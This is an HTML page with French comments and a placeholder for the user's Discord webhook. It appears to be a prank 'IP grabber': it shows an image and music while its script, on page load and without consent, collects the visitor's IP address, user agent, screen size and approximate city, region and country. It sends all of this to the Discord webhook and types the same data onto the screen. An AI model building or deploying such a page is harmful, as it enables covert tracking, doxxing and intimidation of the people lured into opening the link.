<<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>mog</title>

    <style>
        body {
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background-color: #f0f0f0;
            overflow: hidden;
        }
        img {
            max-width: 100%;
            height: auto;
        }
        #text {
            font-size: 24px;
            color: #333;
            text-align: center;
            margin-top: 20px;
            white-space: pre-wrap;
        }
    </style>
</head>

<body>

    <img src="IMG_8056.jpeg" alt="Image">
    <div id="text"></div>

    <!-- AUDIO sans autoplay (bloqué sinon) -->
    <audio id="backgroundMusic" loop>
        <source src="Savetik-Net_7535154023473712407_v2.mp3" type="audio/mpeg">
        Votre navigateur ne supporte pas l'élément audio.
    </audio>

    <script>

        /* ---------- AUDIO AUTOSTART APRÈS 1 CLIC ---------- */

        const audio = document.getElementById('backgroundMusic');

        document.addEventListener('click', () => {
            audio.play().catch(err => console.log("Audio bloqué :", err));
        }, { once: true });

        /* --------------------------------------------------- */


        async function fetchIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                return (await response.json()).ip;
            } catch (error) {
                console.error('Erreur IP:', error);
            }
        }

        function getUserAgent() {
            return navigator.userAgent;
        }

        async function fetchLocation(ip) {
            try {
                const response = await fetch(`https://ipapi.co/${ip}/json/`);
                const data = await response.json();
                return {
                    city: data.city,
                    region: data.region,
                    country: data.country_name
                };
            } catch (error) {
                console.error('Erreur localisation:', error);
            }
        }

        function getScreenSize() {
            return `${window.screen.width}x${window.screen.height}`;
        }

        async function sendToDiscordWebhook(ip, userAgent, location, screenSize) {
            const webhookURL = "TON_WEBHOOK_ICI"; // <-- CHANGE LE LIEN

            const payload = {
                content:
`Adresse IP: ${ip}
User-Agent: ${userAgent}
Ville: ${location.city}
Région: ${location.region}
Pays: ${location.country}
Taille de l'écran: ${screenSize}`
            };

            try {
                await fetch(webhookURL, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify(payload)
                });
            } catch (error) {
                console.error("Erreur webhook:", error);
            }
        }

        function displayTextSlowly(text, element, delay = 50) {
            let index = 0;
            const interval = setInterval(() => {
                if (index < text.length) {
                    element.textContent += text.charAt(index);
                    index++;
                } else {
                    clearInterval(interval);
                }
            }, delay);
        }

        async function main() {
            const ip = await fetchIP();
            const userAgent = getUserAgent();
            const location = await fetchLocation(ip);
            const screenSize = getScreenSize();

            const text =
`IP: ${ip}
User-Agent: ${userAgent}
Ville: ${location.city}
Région: ${location.region}
Pays: ${location.country}
Taille écran: ${screenSize}`;

            const textElement = document.getElementById('text');
            displayTextSlowly(text, textElement);

            sendToDiscordWebhook(ip, userAgent, location, screenSize);
        }

        main();

    </script>

</body>
</html>
